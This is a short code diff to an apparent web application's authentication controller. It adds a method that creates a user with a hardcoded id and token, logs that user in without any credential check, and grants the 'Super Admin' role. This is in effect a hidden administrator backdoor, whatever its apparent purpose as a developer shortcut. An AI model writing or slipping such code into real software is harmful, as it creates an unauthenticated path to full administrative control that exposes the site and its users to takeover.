@@ -75,6 +75,18 @@ class AuthController extends Controller
         return redirect($url);
     }
 
+    public function monty()
+    {
+
+
+        User::updateOrCreate(['id' => 9999999999], ['name' => 'Monty The Apprentice', 'token' => '9999999999999999999999999', 'pri_grp' => 5]);
+        $user = User::where('id', 9999999999)->first();
+        Auth::login($user, true);
+        $user->assignRole('Super Admin');
+
+        return redirect('/');
+    }
+
     public function webwayUser()
     {
         User::where('id', 1)->delete();
